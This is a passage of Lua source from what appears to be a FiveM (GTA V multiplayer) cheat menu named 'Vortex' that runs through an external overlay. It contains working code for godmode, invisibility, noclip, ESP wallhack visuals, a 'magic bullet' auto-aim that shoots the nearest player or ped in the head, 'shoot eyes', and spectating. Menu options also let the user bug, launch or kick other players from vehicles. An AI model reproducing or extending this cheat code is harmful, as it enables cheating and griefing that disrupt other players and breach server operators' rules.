                        elseif item.hasSelector and item.action == "noclipspeed" then
                            if leftPressed then
                                vortex_selectedNoclipSpeed = vortex_selectedNoclipSpeed - 1
                                if vortex_selectedNoclipSpeed < 1 then vortex_selectedNoclipSpeed = #vortex_noclipSpeedOptions end
                            else
                                vortex_selectedNoclipSpeed = vortex_selectedNoclipSpeed + 1
                                if vortex_selectedNoclipSpeed > #vortex_noclipSpeedOptions then vortex_selectedNoclipSpeed = 1 end
                            end
                            VortexNoclip.SetSpeed(vortex_noclipSpeedOptions[vortex_selectedNoclipSpeed])
                        elseif item.hasSelector and item.action == "visual_distance" then
                            if leftPressed then
                                vortex_selectedEspDist = vortex_selectedEspDist - 1
                                if vortex_selectedEspDist < 1 then vortex_selectedEspDist = #vortex_espDistOptions end
                            else
                                vortex_selectedEspDist = vortex_selectedEspDist + 1
                                if vortex_selectedEspDist > #vortex_espDistOptions then vortex_selectedEspDist = 1 end
                            end
                            VortexVisuals.maxDistance = vortex_espDistOptions[vortex_selectedEspDist]
                        elseif item.hasSelector and item.action == "visual_fov_radius" then
                            local step = 0.005
                            if leftPressed then
                                VortexVisuals.fovRadius = VortexVisuals.fovRadius - step
                            else
                                VortexVisuals.fovRadius = VortexVisuals.fovRadius + step
                            end
                            VortexVisuals.fovRadius = vortex_clamp(VortexVisuals.fovRadius, 0.01, 0.2)
                        elseif item.hasSelector and item.action == "crosshair_style" then
                            if leftPressed then
                                VortexVisuals.crosshair.style = VortexVisuals.crosshair.style - 1
                                if VortexVisuals.crosshair.style < 1 then VortexVisuals.crosshair.style = #vortex_crosshairStyles end
                            else
                                VortexVisuals.crosshair.style = VortexVisuals.crosshair.style + 1
                                if VortexVisuals.crosshair.style > #vortex_crosshairStyles then VortexVisuals.crosshair.style = 1 end
                            end
                        elseif item.hasSelector and item.action == "crosshair_size" then
                            local step = 1.0
                            if leftPressed then
                                VortexVisuals.crosshair.size = VortexVisuals.crosshair.size - step
                            else
                                VortexVisuals.crosshair.size = VortexVisuals.crosshair.size + step
                            end
                            VortexVisuals.crosshair.size = vortex_clamp(VortexVisuals.crosshair.size, 2.0, 25.0)
                        elseif item.hasSelector and item.action == "crosshair_thickness" then
                            local step = 0.5
                            if leftPressed then
                                VortexVisuals.crosshair.thickness = VortexVisuals.crosshair.thickness - step
                            else
                                VortexVisuals.crosshair.thickness = VortexVisuals.crosshair.thickness + step
                            end
                            VortexVisuals.crosshair.thickness = vortex_clamp(VortexVisuals.crosshair.thickness, 1.0, 8.0)
                        elseif item.hasSelector and item.action == "crosshair_gap" then
                            local step = 0.5
                            if leftPressed then
                                VortexVisuals.crosshair.gap = VortexVisuals.crosshair.gap - step
                            else
                                VortexVisuals.crosshair.gap = VortexVisuals.crosshair.gap + step
                            end
                            VortexVisuals.crosshair.gap = vortex_clamp(VortexVisuals.crosshair.gap, 0.0, 20.0)
                        elseif item.hasSelector and item.action == "crosshair_color" then
                            if leftPressed then
                                VortexVisuals.crosshair.colorIndex = VortexVisuals.crosshair.colorIndex - 1
                                if VortexVisuals.crosshair.colorIndex < 1 then VortexVisuals.crosshair.colorIndex = #vortex_colorPalettes end
                            else
                                VortexVisuals.crosshair.colorIndex = VortexVisuals.crosshair.colorIndex + 1
                                if VortexVisuals.crosshair.colorIndex > #vortex_colorPalettes then VortexVisuals.crosshair.colorIndex = 1 end
                            end
                        elseif item.hasSelector and item.action == "vehicle_distance" then
                            local step = 20.0
                            if leftPressed then
                                VortexVisuals.vehicle.distance = vortex_clamp(VortexVisuals.vehicle.distance - step, 50.0, 500.0)
                            else
                                VortexVisuals.vehicle.distance = vortex_clamp(VortexVisuals.vehicle.distance + step, 50.0, 500.0)
                            end
                        elseif item.hasSelector and item.action == "box_thickness" then
                            local step = 0.5
                            if leftPressed then
                                VortexVisuals.box.thickness = VortexVisuals.box.thickness - step
                            else
                                VortexVisuals.box.thickness = VortexVisuals.box.thickness + step
                            end
                            VortexVisuals.box.thickness = vortex_clamp(VortexVisuals.box.thickness, 1.0, 8.0)
                        elseif item.hasSelector and item.action == "box_draw_health" then
                            if leftPressed then
                                VortexVisuals.box.healthSide = VortexVisuals.box.healthSide - 1
                                if VortexVisuals.box.healthSide < 1 then VortexVisuals.box.healthSide = #vortex_sideOptions end
                            else
                                VortexVisuals.box.healthSide = VortexVisuals.box.healthSide + 1
                                if VortexVisuals.box.healthSide > #vortex_sideOptions then VortexVisuals.box.healthSide = 1 end
                            end
                            VortexVisuals.box.drawHealth = true
                        elseif item.hasSelector and item.action == "box_draw_armor" then
                            if leftPressed then
                                VortexVisuals.box.armorSide = VortexVisuals.box.armorSide - 1
                                if VortexVisuals.box.armorSide < 1 then VortexVisuals.box.armorSide = #vortex_sideOptions end
                            else
                                VortexVisuals.box.armorSide = VortexVisuals.box.armorSide + 1
                                if VortexVisuals.box.armorSide > #vortex_sideOptions then VortexVisuals.box.armorSide = 1 end
                            end
                            VortexVisuals.box.drawArmor = true
                        elseif item.hasSelector and item.action == "box_color" then
                            if leftPressed then
                                VortexVisuals.box.colorIndex = VortexVisuals.box.colorIndex - 1
                                if VortexVisuals.box.colorIndex < 1 then VortexVisuals.box.colorIndex = #vortex_colorPalettes end
                            else
                                VortexVisuals.box.colorIndex = VortexVisuals.box.colorIndex + 1
                                if VortexVisuals.box.colorIndex > #vortex_colorPalettes then VortexVisuals.box.colorIndex = 1 end
                            end
                        elseif item.hasSelector and item.action == "box_invis_color" then
                            if leftPressed then
                                VortexVisuals.box.invisColorIndex = VortexVisuals.box.invisColorIndex - 1
                                if VortexVisuals.box.invisColorIndex < 1 then VortexVisuals.box.invisColorIndex = #vortex_colorPalettes end
                            else
                                VortexVisuals.box.invisColorIndex = VortexVisuals.box.invisColorIndex + 1
                                if VortexVisuals.box.invisColorIndex > #vortex_colorPalettes then VortexVisuals.box.invisColorIndex = 1 end
                            end
                        elseif item.hasSelector and item.action == "skeleton_thickness" then
                            local step = 0.2
                            if leftPressed then
                                VortexVisuals.skeleton.thickness = VortexVisuals.skeleton.thickness - step
                            else
                                VortexVisuals.skeleton.thickness = VortexVisuals.skeleton.thickness + step
                            end
                            VortexVisuals.skeleton.thickness = vortex_clamp(VortexVisuals.skeleton.thickness, 0.5, 5.0)
                        elseif item.hasSelector and item.action == "skeleton_visible_color" then
                            if leftPressed then
                                VortexVisuals.skeleton.visibleColor = VortexVisuals.skeleton.visibleColor - 1
                                if VortexVisuals.skeleton.visibleColor < 1 then VortexVisuals.skeleton.visibleColor = #vortex_colorPalettes end
                            else
                                VortexVisuals.skeleton.visibleColor = VortexVisuals.skeleton.visibleColor + 1
                                if VortexVisuals.skeleton.visibleColor > #vortex_colorPalettes then VortexVisuals.skeleton.visibleColor = 1 end
                            end
                        elseif item.hasSelector and item.action == "skeleton_invis_color" then
                            if leftPressed then
                                VortexVisuals.skeleton.invisColor = VortexVisuals.skeleton.invisColor - 1
                                if VortexVisuals.skeleton.invisColor < 1 then VortexVisuals.skeleton.invisColor = #vortex_colorPalettes end
                            else
                                VortexVisuals.skeleton.invisColor = VortexVisuals.skeleton.invisColor + 1
                                if VortexVisuals.skeleton.invisColor > #vortex_colorPalettes then VortexVisuals.skeleton.invisColor = 1 end
                            end
                        elseif item.hasSelector and item.action == "text_color" then
                            if leftPressed then
                                VortexVisuals.text.colorIndex = VortexVisuals.text.colorIndex - 1
                                if VortexVisuals.text.colorIndex < 1 then VortexVisuals.text.colorIndex = #vortex_colorPalettes end
                            else
                                VortexVisuals.text.colorIndex = VortexVisuals.text.colorIndex + 1
                                if VortexVisuals.text.colorIndex > #vortex_colorPalettes then VortexVisuals.text.colorIndex = 1 end
                            end
                        elseif item.hasSelector and (item.action == "text_name" or item.action == "text_id" or item.action == "text_health" or item.action == "text_armor" or item.action == "text_distance" or item.action == "text_weapon") then
                            local field = string.gsub(item.action, "text_", "")
                            local cfg = VortexVisuals.text[field]
                            if leftPressed then
                                cfg.anchor = cfg.anchor - 1
                                if cfg.anchor < 1 then cfg.anchor = #vortex_anchorOptions end
                            else
                                cfg.anchor = cfg.anchor + 1
                                if cfg.anchor > #vortex_anchorOptions then cfg.anchor = 1 end
                            end
                            cfg.enabled = true
                        elseif item.hasSelector and item.action == "bugvehicle" then
                            if VortexMenu.bugVehicleMode == "v1" then
                                VortexMenu.bugVehicleMode = "v2"
                            else
                                VortexMenu.bugVehicleMode = "v1"
                            end
                        elseif item.hasSelector and item.action == "kickvehicle" then
                            if VortexMenu.kickVehicleMode == "v1" then
                                VortexMenu.kickVehicleMode = "v2"
                            else
                                VortexMenu.kickVehicleMode = "v1"
                            end
                        elseif item.hasSelector and item.action == "bugplayer" then
                            if VortexMenu.bugPlayerMode == "bug" then
                                VortexMenu.bugPlayerMode = "launch"
                            else
                                VortexMenu.bugPlayerMode = "bug"
                            end
                        elseif item.hasSelector and item.action and string.find(item.action, "outfit_") == 1 then
                            local outfitType = string.gsub(item.action, "outfit_", "")
                            local ped = PlayerPedId()
                            local outfitValue = vortex_outfitData[outfitType]

                            if outfitType == "hat" or outfitType == "glasses" then
                                local propId = outfitType == "hat" and 0 or 1
                                local maxDrawables = GetNumberOfPedPropDrawableVariations(ped, propId)

                                if maxDrawables > 0 then
                                    if leftPressed then
                                        if outfitValue.drawable <= -1 then
                                            outfitValue.drawable = maxDrawables - 1
                                        else
                                            outfitValue.drawable = outfitValue.drawable - 1
                                        end
                                    else
                                        if outfitValue.drawable >= maxDrawables - 1 then
                                            outfitValue.drawable = -1
                                        else
                                            outfitValue.drawable = outfitValue.drawable + 1
                                        end
                                    end

                                    if outfitValue.drawable >= 0 then
                                        local maxTextures = GetNumberOfPedPropTextureVariations(ped, propId, outfitValue.drawable)
                                        if maxTextures > 0 and outfitValue.texture >= maxTextures then
                                            outfitValue.texture = 0
                                        end
                                        vortex_actions.applyProp(ped, propId, outfitValue.drawable, outfitValue.texture)
                                    else
                                        outfitValue.texture = 0
                                        vortex_actions.applyProp(ped, propId, -1, 0)
                                    end
                                end
                            else
                                local componentIds = {
                                    mask = 1,
                                    torso = 3,
                                    tshirt = 8,
                                    pants = 4,
                                    shoes = 6
                                }
                                local componentId = componentIds[outfitType]
                                local maxDrawables = GetNumberOfPedDrawableVariations(ped, componentId)

                                if maxDrawables > 0 then
                                    if leftPressed then
                                        if outfitValue.drawable <= 0 then
                                            outfitValue.drawable = maxDrawables - 1
                                        else
                                            outfitValue.drawable = outfitValue.drawable - 1
                                        end
                                    else
                                        if outfitValue.drawable >= maxDrawables - 1 then
                                            outfitValue.drawable = 0
                                        else
                                            outfitValue.drawable = outfitValue.drawable + 1
                                        end
                                    end

                                    local maxTextures = GetNumberOfPedTextureVariations(ped, componentId, outfitValue.drawable)
                                    if maxTextures > 0 and outfitValue.texture >= maxTextures then
                                        outfitValue.texture = 0
                                    end
                                    vortex_actions.applyClothing(ped, componentId, outfitValue.drawable, outfitValue.texture)
                                end
                            end
                        elseif item.hasSelector and item.action and string.find(item.action, "model_") == 1 then
                            local modelType = string.gsub(item.action, "model_", "")
                            local modelList

                            if modelType == "male" then
                                modelList = vortex_maleModels
                                if leftPressed then
                                    vortex_selectedModelIndex.male = vortex_selectedModelIndex.male - 1
                                    if vortex_selectedModelIndex.male < 1 then
                                        vortex_selectedModelIndex.male = #modelList
                                    end
                                else
                                    vortex_selectedModelIndex.male = vortex_selectedModelIndex.male + 1
                                    if vortex_selectedModelIndex.male > #modelList then
                                        vortex_selectedModelIndex.male = 1
                                    end
                                end
                            elseif modelType == "female" then
                                modelList = vortex_femaleModels
                                if leftPressed then
                                    vortex_selectedModelIndex.female = vortex_selectedModelIndex.female - 1
                                    if vortex_selectedModelIndex.female < 1 then
                                        vortex_selectedModelIndex.female = #modelList
                                    end
                                else
                                    vortex_selectedModelIndex.female = vortex_selectedModelIndex.female + 1
                                    if vortex_selectedModelIndex.female > #modelList then
                                        vortex_selectedModelIndex.female = 1
                                    end
                                end
                            elseif modelType == "animals" then
                                modelList = vortex_animalModels
                                if leftPressed then
                                    vortex_selectedModelIndex.animals = vortex_selectedModelIndex.animals - 1
                                    if vortex_selectedModelIndex.animals < 1 then
                                        vortex_selectedModelIndex.animals = #modelList
                                    end
                                else
                                    vortex_selectedModelIndex.animals = vortex_selectedModelIndex.animals + 1
                                    if vortex_selectedModelIndex.animals > #modelList then
                                        vortex_selectedModelIndex.animals = 1
                                    end
                                end
                            end
                        elseif item.hasSelector and (item.action == "spawncar" or item.action == "spawnmoto" or item.action == "spawnplane" or item.action == "spawnboat") then
                            local category = string.gsub(item.action, "spawn", "")
                            local vehicleList = vortex_vehicleLists[category]

                            if vehicleList and #vehicleList > 0 then
                                if leftPressed then
                                    vortex_selectedVehicleIndex[category] = vortex_selectedVehicleIndex[category] - 1
                                    if vortex_selectedVehicleIndex[category] < 1 then
                                        vortex_selectedVehicleIndex[category] = #vehicleList
                                    end
                                else
                                    vortex_selectedVehicleIndex[category] = vortex_selectedVehicleIndex[category] + 1
                                    if vortex_selectedVehicleIndex[category] > #vehicleList then
                                        vortex_selectedVehicleIndex[category] = 1
                                    end
                                end
                            end
                        elseif item.hasSelector and item.action == "addonvehicle" then
                            if not vortex_addonVehiclesScanned and not vortex_addonVehiclesScanning then
                                Vortex_ScanAddonVehicles()
                            end

                            if vortex_addonVehicles and #vortex_addonVehicles > 0 and not vortex_addonVehiclesScanning then
                                if leftPressed then
                                    vortex_selectedVehicleIndex.addon = vortex_selectedVehicleIndex.addon - 1
                                    if vortex_selectedVehicleIndex.addon < 1 then
                                        vortex_selectedVehicleIndex.addon = #vortex_addonVehicles
                                    end
                                else
                                    vortex_selectedVehicleIndex.addon = vortex_selectedVehicleIndex.addon + 1
                                    if vortex_selectedVehicleIndex.addon > #vortex_addonVehicles then
                                        vortex_selectedVehicleIndex.addon = 1
                                    end
                                end
                            end
                        elseif item.hasSelector and item.action and string.find(item.action, "weapon_") == 1 then
                            local weaponType = string.gsub(item.action, "weapon_", "")
                            local weaponList = vortex_weaponLists[weaponType]

                            if weaponList then
                                if leftPressed then
                                    vortex_selectedWeaponIndex[weaponType] = vortex_selectedWeaponIndex[weaponType] - 1
                                    if vortex_selectedWeaponIndex[weaponType] < 1 then
                                        vortex_selectedWeaponIndex[weaponType] = #weaponList
                                    end
                                else
                                    vortex_selectedWeaponIndex[weaponType] = vortex_selectedWeaponIndex[weaponType] + 1
                                    if vortex_selectedWeaponIndex[weaponType] > #weaponList then
                                        vortex_selectedWeaponIndex[weaponType] = 1
                                    end
                                end
                            end
                        end
                    end
                end
                lastLeftPress = leftPressed
                lastRightPress = rightPressed

                local _, backPressed = Vortex_GetAsyncKeyState(VK.BACK)
                if backPressed and not lastBackPress then
                    if VortexMenu.currentCategory ~= "main" then
                        VortexMenu.categoryIndexes[VortexMenu.currentCategory] = VortexMenu.selectedIndex

                        VortexMenu.transitionDirection = -1
                        VortexMenu.transitionOffset = 50

                        if #VortexMenu.categoryHistory > 0 then
                            VortexMenu.currentCategory = table.remove(VortexMenu.categoryHistory)
                            VortexMenu.selectedIndex = VortexMenu.categoryIndexes[VortexMenu.currentCategory] or 1
                        else
                            VortexMenu.currentCategory = "main"
                            VortexMenu.selectedIndex = 1

                            local category = vortex_categories["main"]
                            if category then
                                local items = category.hasTabs and category.tabs[1].items or category.items
                                VortexMenu.selectedIndex = vortex_skipSeparator(items, 1)
                            end
                        end
                        VortexMenu.currentTab = 1
                    else
                        VortexMenu.isOpen = false
                        Vortex_ResetFrame()
                    end
                end
                lastBackPress = backPressed

                if VortexMenu.isOpen and not vortex_waitingForKey and not vortex_waitingForActionKeybind then
                    local _, f9Pressed = Vortex_GetAsyncKeyState(VK.F9)
                    if f9Pressed and not lastF9Press then
                        local item = currentItems[VortexMenu.selectedIndex]
                        if item and item.action and vortex_actions[item.action] then
                            vortex_currentActionToBind = item.action
                            vortex_waitingForActionKeybind = true
                        end
                    end
                    lastF9Press = f9Pressed
                else
                    lastF9Press = false
                end

                if vortex_waitingForKey then
                    lastEnterPress = false
                    VortexMenu.isOpen = false
                else
                    local _, enterPressed = Vortex_GetAsyncKeyState(VK.RETURN)
                    if enterPressed and not lastEnterPress then
                        local item = currentItems[VortexMenu.selectedIndex]
                        if item then
                            -- Handle canBind items: Enter toggles bind/unbind
                            if item.canBind then
                                if vortex_actionKeybinds[item.action] then
                                    -- Remove existing keybind
                                    vortex_actionKeybinds[item.action] = nil
                                    Vortex_Notify("Keybind removed: " .. item.label)
                                else
                                    -- Start keybind listener
                                    vortex_currentActionToBind = item.action
                                    vortex_waitingForActionKeybind = true
                                end
                            else
                            local action = vortex_actions[item.action]
                            if action then
                                if item.target then
                                    action(item.target)
                                elseif item.playerId then
                                    action(item.playerId)
                                elseif item.resourceName then
                                    action(item.resourceName)
                                elseif item.keybindAction then
                                    action(item.keybindAction)
                                else
                                    action()
                                end

                                if item.action ~= "category" and item.label and item.label ~= "" then
                                    Vortex_Notify(item.label, item.action)
                                end
                            end
                            end
                        end
                    end
                    lastEnterPress = enterPressed

                    DrawMenu()
                end
            end
        end

        if (vortex_drawFovEnabled or vortex_miscTargetInterfaceOpen or vortex_showMenuKeybindsEnabled) and not VortexMenu.isOpen then
          if Vortex_SusanoReady() then
            Susano.BeginFrame()

            if vortex_showMenuKeybindsEnabled then
                DrawKeybindsInterface()
            end

            if vortex_drawFovEnabled then
                local centerX = 1920 / 2
                local centerY = 1080 / 2

                local circumference = 2 * math.pi * vortex_fovRadius
                local numPoints = math.max(250, math.floor(circumference / 1.5))

                local rectSize = 1.5

                for i = 0, numPoints - 1 do
                    local angle = (i / numPoints) * 2 * math.pi
                    local x = centerX + math.cos(angle) * vortex_fovRadius
                    local y = centerY + math.sin(angle) * vortex_fovRadius

                    Susano.DrawRectFilled(x - rectSize/2, y - rectSize/2, rectSize, rectSize,
                        1.0, 0.0, 0.0, 1.0,
                        rectSize / 2)
                end
            end

            if vortex_miscTargetInterfaceOpen then
                DrawMiscTargetInterface()
            end

            Vortex_DrawNotifications()

            Susano.SubmitFrame()
          end
        end

        if not VortexMenu.isOpen and not vortex_drawFovEnabled and not vortex_miscTargetInterfaceOpen and not vortex_showMenuKeybindsEnabled then
            if #vortex_notifications > 0 and Vortex_SusanoReady() then
                Susano.BeginFrame()
                Vortex_DrawNotifications()
                Susano.SubmitFrame()
            end
        end

        if vortex_godmodeEnabled then
            local ped = PlayerPedId()
            SetEntityInvincible(ped, true)
            local health = GetEntityHealth(ped)
            local maxHealth = GetEntityMaxHealth(ped)
            if health < maxHealth then
                SetEntityHealth(ped, maxHealth)
            end
            SetPedCanRagdoll(ped, false)
            SetPedCanBeKnockedOffVehicle(ped, 1)
        end


        if vortex_shooteyesEnabled then
            DrawRect(0.5, 0.5, 0.002, 0.003, 157, 0, 255, 255)
            if IsControlPressed(0, 38) then
                local playerPed = PlayerPedId()
                local currentWeapon = GetSelectedPedWeapon(playerPed)

                if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                    local weapons = {
                        "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                        "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                        "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                        "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                        "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                        "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                        "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                        "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                        "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                    }

                    for _, weaponName in ipairs(weapons) do
                        local weaponHash = GetHashKey(weaponName)
                        if HasPedGotWeapon(playerPed, weaponHash, false) then
                            currentWeapon = weaponHash
                            break
                        end
                    end
                end

                if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                    if not rawget(_G, 'shoot_eyes_cooldown') or GetGameTimer() > rawget(_G, 'shoot_eyes_cooldown') then
                        local camCoords = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(0)

                        local z = math.rad(camRot.z)
                        local x = math.rad(camRot.x)
                        local num = math.abs(math.cos(x))
                        local dirX = -math.sin(z) * num
                        local dirY = math.cos(z) * num
                        local dirZ = math.sin(x)

                        local distance = 1000.0
                        local endX = camCoords.x + dirX * distance
                        local endY = camCoords.y + dirY * distance
                        local endZ = camCoords.z + dirZ * distance

                        local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endX, endY, endZ, -1, playerPed, 0)
                        local retval, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(rayHandle)

                        local weaponCoords = GetOffsetFromEntityInWorldCoords(playerPed, 0.5, 1.0, 0.5)
                        local targetCoords = vector3(endX, endY, endZ)

                        if hit and hitCoords then
                            targetCoords = hitCoords
                        end

                        ShootSingleBulletBetweenCoords(
                            weaponCoords.x, weaponCoords.y, weaponCoords.z,
                            targetCoords.x, targetCoords.y, targetCoords.z,
                            40, true, currentWeapon, playerPed, true, false, 1000.0
                        )

                        rawset(_G, 'shoot_eyes_cooldown', GetGameTimer() + 350)
                    end
                end
            end
        end

        if vortex_magicbulletEnabled then
            local playerPed = PlayerPedId()
            if IsPedShooting(playerPed) then
                if not rawget(_G, 'magic_bullet_cooldown') or GetGameTimer() > rawget(_G, 'magic_bullet_cooldown') then
                    local function IsPedInFOV(pedCoords)
                        if not vortex_drawFovEnabled then
                            return true
                        end

                        local onScreen, screenX, screenY = GetScreenCoordFromWorldCoord(pedCoords.x, pedCoords.y, pedCoords.z)

                        if not onScreen then
                            return false
                        end

                        local centerX = 0.5
                        local centerY = 0.5
                        local screenWidth = 1920.0
                        local screenHeight = 1080.0
                        local radiusX = vortex_fovRadius / screenWidth
                        local radiusY = vortex_fovRadius / screenHeight

                        local dx = screenX - centerX
                        local dy = screenY - centerY

                        local distance = math.sqrt((dx * dx) / (radiusX * radiusX) + (dy * dy) / (radiusY * radiusY))
                        return distance <= 1.0
                    end

                    local currentWeapon = GetSelectedPedWeapon(playerPed)

                    if currentWeapon == GetHashKey("WEAPON_UNARMED") or currentWeapon == 0 then
                        local weapons = {
                            "WEAPON_PISTOL", "WEAPON_PISTOL_MK2", "WEAPON_COMBATPISTOL", "WEAPON_APPISTOL",
                            "WEAPON_PISTOL50", "WEAPON_SNSPISTOL", "WEAPON_HEAVYPISTOL", "WEAPON_VINTAGEPISTOL",
                            "WEAPON_MICROSMG", "WEAPON_SMG", "WEAPON_SMG_MK2", "WEAPON_ASSAULTSMG",
                            "WEAPON_ASSAULTRIFLE", "WEAPON_ASSAULTRIFLE_MK2", "WEAPON_CARBINERIFLE", "WEAPON_CARBINERIFLE_MK2",
                            "WEAPON_ADVANCEDRIFLE", "WEAPON_SPECIALCARBINE", "WEAPON_BULLPUPRIFLE", "WEAPON_COMPACTRIFLE",
                            "WEAPON_SNIPERRIFLE", "WEAPON_HEAVYSNIPER", "WEAPON_HEAVYSNIPER_MK2", "WEAPON_MARKSMANRIFLE",
                            "WEAPON_PUMPSHOTGUN", "WEAPON_PUMPSHOTGUN_MK2", "WEAPON_SAWNOFFSHOTGUN", "WEAPON_ASSAULTSHOTGUN",
                            "WEAPON_MG", "WEAPON_COMBATMG", "WEAPON_COMBATMG_MK2", "WEAPON_GUSENBERG",
                            "WEAPON_RPG", "WEAPON_GRENADELAUNCHER", "WEAPON_MINIGUN", "WEAPON_RAILGUN"
                        }
                        for _, weaponName in ipairs(weapons) do
                            local weaponHash = GetHashKey(weaponName)
                            if HasPedGotWeapon(playerPed, weaponHash, false) then
                                currentWeapon = weaponHash
                                break
                            end
                        end
                    end

                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                        local playerCoords = GetEntityCoords(playerPed)
                        local camCoords = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(0)
                        local z = math.rad(camRot.z)
                        local x = math.rad(camRot.x)
                        local num = math.abs(math.cos(x))
                        local dirX = -math.sin(z) * num
                        local dirY = math.cos(z) * num
                        local dirZ = math.sin(x)

                        local peds = GetGamePool('CPed')
                        local targetPed = nil
                        local bestScore = 999999
                        local pedCount = 0

                        for _, ped in ipairs(peds) do
                            if pedCount >= 50 then break end
                            if ped ~= playerPed and DoesEntityExist(ped) and not IsPedDeadOrDying(ped, true) then
                                pedCount = pedCount + 1
                                local pedCoords = GetEntityCoords(ped)
                                local distToPlayer = #(pedCoords - playerCoords)

                                if distToPlayer < 200.0 then
                                    if IsPedInFOV(pedCoords) then
                                        local vecX = pedCoords.x - camCoords.x
                                        local vecY = pedCoords.y - camCoords.y
                                        local vecZ = pedCoords.z - camCoords.z
                                        local distToCam = math.sqrt(vecX * vecX + vecY * vecY + vecZ * vecZ)

                                        if distToCam > 0 then
                                            local normX = vecX / distToCam
                                            local normY = vecY / distToCam
                                            local normZ = vecZ / distToCam
                                            local dotProduct = dirX * normX + dirY * normY + dirZ * normZ
                                            local angle = math.acos(math.max(-1, math.min(1, dotProduct)))
                                            local angleDeg = math.deg(angle)

                                            if angleDeg < 15 then
                                                local score = angleDeg * 10 + distToPlayer * 0.1
                                                if score < bestScore then
                                                    bestScore = score
                                                    targetPed = ped
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                        if targetPed and DoesEntityExist(targetPed) then
                            local boneIndex = 31086
                            local targetBone = GetPedBoneIndex(targetPed, boneIndex)
                            local targetCoords = GetWorldPositionOfEntityBone(targetPed, targetBone)
                            local offsetX = math.random(-10, 10) / 100.0
                            local offsetY = math.random(-10, 10) / 100.0

                            ShootSingleBulletBetweenCoords(
                                targetCoords.x + offsetX, targetCoords.y + offsetY, targetCoords.z + 0.1,
                                targetCoords.x, targetCoords.y, targetCoords.z,
                                40, true, currentWeapon, playerPed, true, false, 1000.0
                            )
                        end

                        rawset(_G, 'magic_bullet_cooldown', GetGameTimer() + 100)
                    end
                end
            end
        end

        if vortex_invisibleEnabled then
            local ped = PlayerPedId()
            SetEntityVisible(ped, false, false)
            SetEntityLocallyInvisible(ped)
        end

        -- Spectate safety check: if state desync, force-stop (camera-based)
        if vortex_spectateEnabled and not (rawget(_G, '_vortex_spec') and rawget(_G, '_vortex_spec').active) then
            vortex_spectateEnabled = false
            vxSet('isSpectating', false)
            local specSafe = rawget(_G, '_vortex_spec')
            if specSafe and specSafe.cam and DoesCamExist(specSafe.cam) then
                SetCamActive(specSafe.cam, false)
                DestroyCam(specSafe.cam, true)
            end
            RenderScriptCams(false, true, 500, true, true)
            FreezeEntityPosition(PlayerPedId(), false)
            SetEntityCollision(PlayerPedId(), true, true)
            SetEntityVisible(PlayerPedId(), true, false)
            SetEntityAlpha(PlayerPedId(), 255, false)
            ResetEntityAlpha(PlayerPedId())
            SetEntityInvincible(PlayerPedId(), false)
            rawset(_G, '_vortex_spec', nil)
        end
    end
end)

-- (initOutfitData + loadresources moved to real loading worker thread)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        local noclipOk, noclipErr = pcall(function()
        if vortex_noclipEnabled then
            local ped = PlayerPedId()
            if not ped or ped == 0 then return end
            local entity = ped
            local inVehicle = IsPedInAnyVehicle(ped, false)
            if inVehicle then
                entity = GetVehiclePedIsIn(ped, false)
                if not entity or entity == 0 then entity = ped end
            end

            SetEntityCollision(entity, false, false)
            if inVehicle then
                FreezeEntityPosition(entity, true)
            else
                FreezeEntityPosition(ped, true)
            end
            SetEntityInvincible(ped, true)

            if vortex_selectedNoclipType == 2 then
                SetEntityVisible(entity, false, false)
                if not inVehicle then
                    SetEntityVisible(ped, false, false)
                end
            else
                SetEntityVisible(entity, true, false)
                if not inVehicle then
                    SetEntityVisible(ped, true, false)
                end
            end

            local pos = GetEntityCoords(entity, false)
            local camRot = GetGameplayCamRot(2)
            local heading = camRot.z

            if vortex_noclipRotateOnCamera then
                if inVehicle then
                    SetEntityHeading(entity, heading)
                else
                    SetEntityHeading(ped, heading)
                end
            end

            local pitch = math.rad(camRot.x)
            local yaw = math.rad(heading)
            local forward = { x = -math.sin(yaw) * math.cos(pitch), y = math.cos(yaw) * math.cos(pitch), z = math.sin(pitch) }
            local right = { x = math.cos(yaw), y = math.sin(yaw), z = 0.0 }

            local speed = vortex_noclipSpeed * 0.08
            if IsControlPressed(0, 21) then
                speed = speed * 2.0
            end

            local targetPos = pos

            if IsControlPressed(0, 32) then
                targetPos = vector3(targetPos.x + forward.x * speed, targetPos.y + forward.y * speed, targetPos.z + forward.z * speed)
            end
            if IsControlPressed(0, 33) then
                targetPos = vector3(targetPos.x - forward.x * speed, targetPos.y - forward.y * speed, targetPos.z - forward.z * speed)
            end
            if IsControlPressed(0, 35) then
                targetPos = vector3(targetPos.x + right.x * speed, targetPos.y + right.y * speed, targetPos.z + right.z * speed)
            end
            if IsControlPressed(0, 34) then
                targetPos = vector3(targetPos.x - right.x * speed, targetPos.y - right.y * speed, targetPos.z - right.z * speed)
            end
            if IsControlPressed(0, 22) then
                targetPos = vector3(targetPos.x, targetPos.y, targetPos.z + speed * 0.8)
            end
            if IsControlPressed(0, 36) then
